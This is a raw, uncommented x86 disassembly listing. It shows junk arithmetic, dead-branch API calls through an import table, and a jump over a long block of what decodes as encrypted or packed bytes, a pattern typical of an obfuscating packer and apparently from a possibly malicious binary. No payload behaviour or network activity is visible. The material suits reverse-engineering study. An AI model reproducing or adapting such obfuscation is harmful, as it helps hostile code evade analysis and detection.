  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428207
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x4281fb,0x428157
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428347,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428247
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428353,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428337
  41f7d9:	mov    DWORD PTR ds:0x42832b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282cf,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42824f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428147,edi
  41f7fe:	cmp    DWORD PTR ds:0x428353,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f3a
  41f813:	push   0x427ea1
  41f818:	call   DWORD PTR ds:0x428e68
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42837b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428237,ecx
  41f830:	adc    DWORD PTR ds:0x42811f,edi
  41f836:	and    DWORD PTR ds:0x42835f,0x3101
  41f840:	mov    DWORD PTR ds:0x428367,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42812f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42821f
  41f857:	mov    DWORD PTR ds:0x42820b,0x4504
  41f861:	mov    DWORD PTR ds:0x42833f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428363
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282cf,ebx
  41f87c:	cmp    DWORD PTR ds:0x42812f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f6c
  41f890:	push   0x427f76
  41f895:	call   DWORD PTR ds:0x428e6c
  41f89b:	and    DWORD PTR ds:0x428147,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282cf,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428363
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428137,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428227,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42833b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428123,0x42835f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428237
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x4281ef
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282c3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428153,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42825f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282b3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428e70
  41f979:	sbb    DWORD PTR ds:0x428363,0x209
  41f983:	xor    DWORD PTR ds:0x428353,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42824f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428153
  41f9bf:	or     DWORD PTR ds:0x42833f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9d1:	mov    DWORD PTR ds:0x4281fb,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282b3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282bb
  41f9f0:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428df4
  41fa08:	adc    DWORD PTR ds:0x42834f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x4282d3,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42832b
  41fa1b:	add    DWORD PTR ds:0x42833b,ecx
  41fa21:	add    DWORD PTR ds:0x428333,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282b3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42825f
  41fa3b:	and    DWORD PTR ds:0x42811f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42820b,0x42814b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428253,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428237,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282c7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428157
  41fa8d:	mov    DWORD PTR ds:0x42814f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428237,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428043
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428df8
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428113
  41fabc:	sbb    ecx,DWORD PTR ds:0x42820b
  41fac2:	mov    DWORD PTR ds:0x428113,ecx
  41fac8:	xor    DWORD PTR ds:0x42825b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428213
  41fad5:	or     DWORD PTR ds:0x4282ab,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42833b
  41fae3:	add    DWORD PTR ds:0x42824f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42812b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282bf
  41fb06:	mov    DWORD PTR ds:0x428343,edx
  41fb0c:	mov    DWORD PTR ds:0x42811f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282c7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428dfc
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428363
  41fb48:	or     ecx,DWORD PTR ds:0x428233
  41fb4e:	mov    DWORD PTR ds:0x428363,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42812b
  41fb5a:	add    ecx,DWORD PTR ds:0x428363
  41fb60:	mov    DWORD PTR ds:0x42812b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42824b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42825f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42820f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428217,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42814f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428247,0x42824b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42835b,0x4282c3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42815b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428367,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428237,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428137,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42809f
  41fbfd:	call   DWORD PTR ds:0x428e00
  41fc03:	and    ecx,DWORD PTR ds:0x428223
  41fc09:	adc    DWORD PTR ds:0x4282b3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282bb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42832b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x4281eb
  41fc21:	mov    DWORD PTR ds:0x42832b,ecx
  41fc27:	and    DWORD PTR ds:0x4282d3,0x55d2
  41fc31:	add    DWORD PTR ds:0x42814f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42823f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42824f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42811b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428237,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428253,ebx
  41fc7a:	mov    DWORD PTR ds:0x428267,0x2746
  41fc84:	mov    DWORD PTR ds:0x428237,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42812b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428e74
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428363
  41fcc1:	and    DWORD PTR ds:0x42812b,0x4282df
  41fccb:	mov    ecx,DWORD PTR ds:0x428133
  41fcd1:	xor    DWORD PTR ds:0x4281ff,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428247
  41fcde:	sub    DWORD PTR ds:0x428353,ecx
  41fce4:	mov    DWORD PTR ds:0x428203,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428367
  41fd0b:	add    eax,DWORD PTR ds:0x42812f
  41fd11:	mov    ds:0x428367,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282bb
  41fd39:	mov    ecx,DWORD PTR ds:0x42834b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x4281eb
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e04
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428233,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42820f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428273
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42825f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428353,0x4282db
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282cf,0x4282d3
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42813f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42832f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42832f
  41fe15:	xor    DWORD PTR ds:0x428337,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe51:	not    DWORD PTR ds:0x42825b
  41fe57:	mov    DWORD PTR ds:0x4281f7,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e08
  41fe7d:	and    DWORD PTR ds:0x428347,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x4281ff
  41fe8d:	movzx  ecx,WORD PTR ds:0x4282d7
  41fe94:	and    DWORD PTR ds:0x4282b3,ecx
  41fe9a:	and    DWORD PTR ds:0x428227,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42816b
  41feab:	mov    ecx,DWORD PTR ds:0x42839f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42814f
  41fed3:	or     DWORD PTR ds:0x428363,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42822b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42832f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282ab,ecx
  41ff06:	cmp    DWORD PTR ds:0x42822b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428113
  41ff18:	call   DWORD PTR ds:0x428e78
  41ff1e:	or     ecx,DWORD PTR ds:0x428133
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x4282d7,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x4281fb,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x90
  41ff55:	cmp    BYTE PTR ds:0x162323be,0x18
  41ff5c:	mov    ds:0xa0181812,eax
  41ff61:	mov    dh,0x9e
  41ff63:	neg    ch
  41ff65:	cmp    dl,BYTE PTR [ebp-0x2b6afdb1]
  41ff6b:	outs   dx,DWORD PTR ds:[esi]
  41ff6c:	mov    ds:0xfb6f7db2,al
  41ff71:	dec    eax
  41ff72:	imul   edx,DWORD PTR [ebp+0x5abc8b31],0x8a7ec787
  41ff7c:	adc    DWORD PTR [eax+edx*4],ecx
  41ff7f:	pop    edi
  41ff80:	push   edx
  41ff81:	push   eax
  41ff82:	rcr    DWORD PTR [edi-0x3e466568],cl
  41ff88:	imul   edx,ebp,0xffffff8c
  41ff8b:	in     al,dx
  41ff8c:	call   0xaabf3f55
  41ff91:	sbb    al,0xbe
  41ff93:	adc    BYTE PTR [edx-0x4e0fb415],0xd5
  41ff9a:	cli    
  41ff9b:	bound  edx,QWORD PTR [ecx-0x48]
  41ff9e:	dec    esi
  41ff9f:	fidivr DWORD PTR [ebx-0x35]
  41ffa2:	inc    ebp
  41ffa3:	lock icebp 
  41ffa5:	(bad)  gs:[esi+0x152b95d4]
  41ffac:	cld    
  41ffad:	xor    al,0x8d
  41ffaf:	sub    DWORD PTR [eax],eax
  41ffb1:	mov    al,0x84
  41ffb3:	xchg   DWORD PTR [ecx],edx
  41ffb5:	ss mov edi,0x928c992b
  41ffbb:	stos   BYTE PTR es:[edi],al
  41ffbc:	repz pop edi
  41ffbe:	add    BYTE PTR [esi],dh
  41ffc0:	pop    edx
  41ffc1:	sar    DWORD PTR [eax],1
  41ffc3:	cwde   
  41ffc4:	fcmovnu st,st(7)
  41ffc6:	fisubr WORD PTR [esi+edi*2]
  41ffc9:	mov    ebx,0x86a422df
  41ffce:	mov    edx,0x895fea34
  41ffd3:	das    
  41ffd4:	jo     0x41ff76
  41ffd6:	mov    edx,0xfab7f17c
  41ffdb:	inc    esi
  41ffdc:	cdq    
  41ffdd:	add    DWORD PTR [ecx+0x272773b0],esp
  41ffe3:	retf   
  41ffe4:	(bad)  
  41ffe5:	or     BYTE PTR [eax+eax*2],al
  41ffe8:	loopne 0x42004e
  41ffea:	outs   dx,DWORD PTR ds:[esi]
  41ffeb:	retf   
  41ffec:	xchg   esi,eax
  41ffed:	xchg   DWORD PTR [ebx-0x4f],ecx
  41fff0:	xchg   esp,eax
  41fff1:	pop    ecx
  41fff2:	push   ss
  41fff3:	jle    0x420019
  41fff5:	mov    DWORD PTR [edi-0x63],esi
  41fff8:	mov    bh,0x81
  41fffa:	bound  esi,QWORD PTR [ecx+0xa]
  41fffd:	aaa    
  41fffe:	sbb    eax,0x5bbd8065
  420003:	mov    dh,0x33
  420005:	push   ss
  420006:	pop    eax
  420007:	xor    BYTE PTR [eax+0x4fa310bd],dh
  42000d:	inc    esp
  42000e:	call   0x94db:0x537ad821
  420015:	sbb    eax,0x18fa6d77
  42001a:	cs sbb eax,0x598aedec
  420020:	aam    0xa6
  420022:	xchg   edi,eax
  420023:	mov    ah,0x40
  420025:	lock mov ch,0xdc
  420028:	mov    eax,ds:0xeee63974
  42002d:	mov    ch,BYTE PTR [esi]
  42002f:	xchg   esp,eax
  420030:	ror    ch,1
  420032:	sbb    esi,esi
  420034:	sbb    ch,BYTE PTR [eax+0x13]
  420037:	and    BYTE PTR [esi-0x1f],ah
  42003a:	mov    dh,0xed
  42003c:	jl     0x42001d
  42003e:	push   ebx
  42003f:	mov    ds:0x904960f4,eax
  420044:	mov    al,0xb1
  420046:	inc    esp
  420047:	stos   BYTE PTR es:[edi],al
  420048:	inc    esp
  420049:	mov    BYTE PTR [ecx-0x1c1115bd],bl
  42004f:	cmp    DWORD PTR [ecx],edx
  420051:	dec    edi
  420052:	gs adc cl,0xd8
  420056:	adc    al,0xe5
  420058:	cdq    
  420059:	cmp    BYTE PTR [edi-0x36],cl
  42005c:	sub    DWORD PTR [esi-0x45],ebp
  42005f:	out    dx,al
  420060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420061:	(bad)  
  420062:	jae    0x420037
  420064:	outs   dx,BYTE PTR ds:[esi]
  420065:	inc    esi
  420066:	push   DWORD PTR [ebx]
  420068:	vfmsub132ps ymm3,ymm4,YMMWORD PTR [edi]
  42006d:	jb     0x4200ee
  42006f:	pop    edx
  420070:	sub    eax,0x1e844ea5
  420075:	mov    ah,0x93
  420077:	dec    ebx
  420078:	mov    eax,esi
  42007a:	outs   dx,DWORD PTR ds:[esi]
  42007b:	bound  edx,QWORD PTR [ebx]
  42007d:	shl    DWORD PTR [esp+ebp*2+0x11],0x1f
  420082:	mov    ecx,0x8deb5bf1
  420087:	pop    edx
  420088:	(bad)  
  420089:	jg     0x4200ba
  42008b:	inc    edi
  42008c:	push   ss
  42008d:	sub    BYTE PTR [ecx],dh
  42008f:	ret    
  420090:	xor    ebx,DWORD PTR [esi-0x2a]
  420093:	repz fisub WORD PTR [edx]
  420096:	pop    esp
  420097:	sub    eax,0xe6effbc3
  42009c:	test   cl,0xeb
  42009f:	(bad)  
  4200a0:	cmc    
  4200a1:	ins    DWORD PTR es:[edi],dx
  4200a2:	in     eax,dx
  4200a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200a4:	and    BYTE PTR ds:0x6aad4711,bh
  4200aa:	cli    
  4200ab:	mov    cl,0x28
  4200ad:	xchg   edi,eax
  4200ae:	mov    dh,cl
  4200b0:	push   edi
  4200b1:	(bad)  
  4200b2:	mov    edi,0x3fab43f5
  4200b7:	dec    edx
  4200b8:	loop   0x42012c
  4200ba:	pop    edi
  4200bb:	cwde   
  4200bc:	repz cdq 
  4200be:	rcl    DWORD PTR [eax],1
  4200c0:	in     al,dx
  4200c1:	cmp    al,0x50
  4200c3:	jmp    0xf0dd:0x55b9a74
  4200ca:	mov    edx,0x2cd9d69a
  4200cf:	cli    
  4200d0:	xchg   edi,eax
  4200d1:	jns    0x42008d
  4200d3:	sahf   
  4200d4:	jnp    0x420106
  4200d6:	xchg   esp,eax
  4200d7:	add    ah,BYTE PTR [eax+0x30]
  4200da:	xchg   ebx,eax
  4200db:	push   esi
  4200dc:	mov    esp,0x6e7b48c3
  4200e1:	clc    
  4200e2:	sub    eax,DWORD PTR [ebx+ecx*1]
  4200e5:	lods   al,BYTE PTR ds:[esi]
  4200e6:	outs   dx,BYTE PTR ds:[esi]
  4200e7:	or     al,0x48
  4200e9:	dec    ecx
  4200ea:	jecxz  0x420089
  4200ec:	jo     0x42014c
  4200ee:	mov    al,0x6e
  4200f0:	popf   
  4200f1:	sub    eax,0x236a26ff
  4200f6:	sub    dl,ah
  4200f8:	jmp    0x3c2d:0xb248bc0a
  4200ff:	xchg   esp,eax
  420100:	inc    esi
  420101:	inc    esp
  420102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420103:	stos   DWORD PTR es:[edi],eax
  420104:	or     eax,0x6de9b0bd
  420109:	pop    ebx
  42010a:	pop    esi
  42010b:	in     eax,dx
  42010c:	jb     0x42013b
  42010e:	mov    ebp,0x4df95041
  420113:	lds    ebx,FWORD PTR [edi]
  420115:	arpl   WORD PTR [eax],dx
  420117:	cs js  0x420197
  42011a:	lds    ecx,FWORD PTR [ecx-0x37]
  42011d:	xor    al,0x54
  42011f:	push   es
  420120:	int3   
  420121:	int3   
  420122:	ss sbb ebx,eax
  420125:	rol    BYTE PTR [ebx+0x7a],cl
  420128:	push   ecx
  420129:	adc    al,0xff
  42012b:	dec    DWORD PTR [edx]
  42012d:	dec    ecx
  42012e:	inc    esp
  42012f:	mov    ?,eax
  420131:	outs   dx,DWORD PTR ds:[esi]
  420132:	xchg   ebx,eax
  420133:	ds stc 
  420135:	xor    al,0x9c
  420137:	pop    ebx
  420138:	lds    eax,FWORD PTR [ebp+0x79]
  42013b:	xor    BYTE PTR [ebp+ebp*4+0x3e96abd8],bl
  420142:	in     eax,dx
  420143:	push   0x39a4a58d
  420148:	sbb    BYTE PTR [esi-0x70],cl
  42014b:	cdq    
  42014c:	mov    al,0x8e
  42014e:	sbb    dh,BYTE PTR [eax+0x5ab7e244]
  420154:	mov    edx,0xa5da7488
  420159:	xchg   esi,eax
  42015a:	mov    edi,0x1475663
  42015f:	repnz (bad) es:[ebp+edi*8+0x75]
  420165:	call   0x82da82fa
  42016a:	push   0xffffffaf
  42016c:	gs push eax
  42016e:	shl    BYTE PTR [ecx+0x990eca5],cl
  420174:	rol    DWORD PTR [eax+0x556283c5],0x97
  42017b:	(bad)  
  42017c:	inc    eax
  42017d:	out    dx,al
  42017e:	outs   dx,BYTE PTR ds:[esi]
  42017f:	fnstcw WORD PTR [edi-0x29d6f5c6]
  420185:	jmp    0x990916fa
  42018a:	fdivr  DWORD PTR [ecx-0x57]
  42018d:	ror    DWORD PTR [esi],1
  42018f:	mul    DWORD PTR [eax]
  420191:	push   cs
  420192:	(bad)  
  420194:	in     al,0x34
  420196:	int3   
  420197:	add    al,0xcb
  420199:	stos   DWORD PTR es:[edi],eax
  42019a:	xor    DWORD PTR [ecx+0x57],ebx
  42019d:	lds    edi,FWORD PTR [ebp+0x3e]
  4201a0:	adc    eax,0xb0b24aaf
  4201a5:	lahf   
  4201a6:	popf   
  4201a7:	idiv   bh
  4201a9:	inc    esi
  4201aa:	and    BYTE PTR [ebp-0x6849107c],0xb9
  4201b1:	mov    ebx,0xfc2eadc5
  4201b6:	mov    ah,0x5a
  4201b8:	pop    ecx
  4201b9:	test   esi,ecx
  4201bb:	fadd   DWORD PTR [ecx+0xb]
  4201be:	stc    
  4201bf:	jno    0x42014b
  4201c1:	sbb    DWORD PTR [eax],edi
  4201c3:	mov    ecx,ebp
  4201c5:	push   ss
  4201c6:	jnp    0x420188
  4201c8:	xchg   edx,eax
  4201c9:	sbb    dl,BYTE PTR [edi+0x34f1615a]
  4201cf:	repnz mov ah,0xfd
  4201d2:	xchg   ecx,eax
  4201d3:	ins    BYTE PTR es:[edi],dx
  4201d4:	lea    edi,[edi+eax*2-0x28bc32ac]
  4201db:	(bad)  
  4201dc:	dec    edi
  4201dd:	mov    ds:0x2f3d00ef,eax
  4201e2:	jns    0x420251
  4201e4:	or     dh,dh
  4201e6:	cmp    eax,0x1c0f214b
  4201eb:	or     BYTE PTR [edx-0x1e3f1171],dh
  4201f1:	cmp    BYTE PTR [edx-0x634124a4],cl
  4201f7:	fs scas al,BYTE PTR es:[edi]
  4201f9:	dec    ebx
  4201fa:	call   eax
  4201fc:	test   al,0x4f
  4201fe:	cwde   
  4201ff:	pusha  
  420200:	mov    al,BYTE PTR [esi+0x67]
  420203:	or     al,0x86
  420205:	sub    eax,0xd0971ba7
  42020a:	xchg   ebx,eax
  42020b:	out    0xa,al
  42020d:	stos   BYTE PTR es:[edi],al
  42020e:	imul   eax
  420210:	and    BYTE PTR [ebp+0x5b804d01],0x8d
  420217:	out    0x57,al
  420219:	pop    ds
  42021a:	push   ebx
  42021b:	xor    eax,ebp
  42021d:	xlat   BYTE PTR ds:[ebx]
  42021e:	jecxz  0x420200
  420220:	and    al,0x3d
  420222:	jne    0x42022b
  420224:	push   ebx
  420225:	push   ebx
  420226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420227:	sub    al,0x36
  420229:	jnp    0x42023d
  42022b:	push   ss
  42022c:	xchg   edi,eax
  42022d:	sub    al,0xce
  42022f:	cmc    
  420230:	add    al,0xa1
  420232:	fcomp  DWORD PTR [edx]
  420234:	push   cs
  420235:	aaa    
  420236:	bound  ecx,QWORD PTR fs:[ebp+0x48]
  42023a:	and    al,0xd4
  42023c:	aas    
  42023d:	mov    ah,BYTE PTR [edi+0xe3951a9]
  420243:	xchg   BYTE PTR [edx+0x6e67db95],cl
  420249:	add    bh,BYTE PTR [esi]
  42024b:	in     eax,0x2f
  42024d:	addr16 dec ecx
  42024f:	std    
  420250:	push   ecx
  420251:	sub    al,0x3f
  420253:	sbb    eax,0xe1e95b33
  420258:	shl    ebx,1
  42025a:	sub    ebp,DWORD PTR [ebx+0x2e]
  42025d:	add    eax,0x85593f42
  420262:	icebp  
  420263:	jne    0x420246
  420265:	mov    ds:0xa8ed2fac,eax
  42026a:	arpl   cx,ax
  42026c:	fisub  WORD PTR [edx+ecx*1-0x13b38380]
  420273:	pop    esp
  420274:	in     eax,0x52
  420276:	fwait
  420277:	or     ch,BYTE PTR [eax+0x74]
  42027a:	test   al,0x40
  42027c:	jp     0x420247
  42027e:	jae    0x420289
  420280:	xchg   esp,eax
  420281:	sbb    DWORD PTR [edx-0x3ca83d31],ebp
